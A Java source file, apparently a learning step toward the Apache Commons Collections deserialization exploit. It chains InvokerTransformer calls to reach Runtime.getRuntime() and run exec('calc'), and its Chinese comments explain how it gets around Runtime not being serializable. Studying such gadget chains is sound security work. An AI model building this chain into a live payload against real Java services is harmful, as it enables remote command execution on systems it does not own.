package FinalTransformMapEXP;

import org.apache.commons.collections.functors.InvokerTransformer;

import java.lang.reflect.Method;

// 解决 Runtime 不能序列化
public class SolvedProblemRuntime {
    public static void main(String[] args) throws Exception{
        /**
        // 普通反射
        Class c = Runtime.class;
        Method runtimemethod = c.getMethod("getRuntime");
        Runtime runtime = (Runtime) runtimeMethod.invoke(null, null);
        Method run = c.getMethod("exec", String.class);
        run.invoke(runtime, "calc");

         */
        // InvokerTransformer 的调用方式
        Class c = Runtime.class;
        //对应 Method runtimeMethod = r.getMethod("getRuntime");
        Method runtimeMethod = (Method) new InvokerTransformer("getMethod"
                , new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}).transform(c);
        //对应 Runtime runtime = (Runtime) runtimeMethod.invoke(null, null);
        Runtime runtime = (Runtime) new InvokerTransformer("invoke"
                , new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(runtimeMethod);
        //对应 r.getMethod("exec", String.class).invoke(runtime, "calc");
        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}).transform(runtime);


    }
}
